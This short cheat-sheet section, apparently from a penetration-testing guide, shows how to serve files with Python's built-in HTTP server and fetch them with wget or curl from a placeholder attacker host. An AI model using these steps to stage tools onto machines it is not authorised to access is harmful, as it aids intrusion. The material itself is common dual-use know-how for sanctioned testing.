
# Python server for file transmission<a name="ft"></a>
If you need to transfer a file from one machine to another, you can follow this process:
```bash 
# machine 1
python3 -m http.server 8081

# machine 2
wget http://<attacker-ip>:<port>/<file>
curl http://<attacker-ip>:<port>/<file> -o <output-file>
```

